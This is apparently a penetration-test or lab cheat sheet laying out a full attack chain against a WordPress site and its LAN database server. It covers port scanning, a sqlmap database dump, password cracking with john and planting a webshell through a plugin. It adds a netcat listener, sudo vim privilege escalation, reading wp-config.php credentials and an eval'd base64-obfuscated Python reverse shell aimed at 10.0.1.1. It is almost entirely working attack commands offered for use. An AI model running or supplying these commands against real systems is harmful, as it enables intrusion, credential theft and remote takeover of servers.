# List of useful commands
This list contains useful commands to use during the attack

# Port enumeration
Enumerates all the open ports in a stealthier way\
`nmap -sS -sV -vv 10.0.1.1 -p-`

# Dumping database
Dumping the database via SQLi\
`sqlmap -u http://www.quinteflush.org/login.php --forms --dump --dbs --batch`

# Crack the hash
From the database, crack the hash in hope of finding an admin password for wordpress\
`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

Then login to `http://www.quinteflush.org/wp-admin` via `admin:********`.\
Install the `File Manager Advanced` plugin and replace a webpage with a webshell.

# Webshell
Use a listener on 0.0.0.0 with either port 80/tcp, 443/tcp or 53/tcp\
`rlwrap nc -lvnp 53`

Go to the edited webpage to trigger the webshell

# Privilege Escalation
First, let's enumerate all what are the sudo rights given to www-data\
`sudo -l`
\
privilege escalation (gtfobins) in interactive mode\
`sudo vim -c ':!/bin/bash -i'`\
\
If you don't use interactive mode, upgrade the shell to interact better with the system\
`python3 -c 'import pty; pty.spawn("/bin/bash")'`

# Information gathering
Check the wordpress configuration to access the database.\
`cat /var/www/wordpress/wp-config.php`

# SSRF RCE Mariadb
Launch mariadb by using the wordpress configuration.\
`mariadb -u wordpress_user -p --host=10.0.0.6`\

Drop the python3 (base64 encoded) payload on the mariadb server, which is on the LAN:\
`eval $(echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTAuMC4xLjEiLDIyKSk7W29zLmR1cDIocy5maWxlbm8oKSxmKWZvciBmIGluKDAsMSwyKV07cHR5LnNwYXduKCJzaCIpJw== | base64 -d)`

On the nmap report, there's a ssh running on port `22/tcp`. Disable the service ssh on webserver:\
`systemctl stop ssh`\

Install `netcat` then launch a listener on port `22`:\
`apt install netcat-openbsd && nc -lvnp 22`\

Wait 1 to 2 minutes, so that the backup script executes our payload.

https://ppn.snovvcrash.rocks/pentest/infrastructure/dbms/mysql-mariadb
https://github.com/soutzis/Penetration-Testing-Helper-Scripts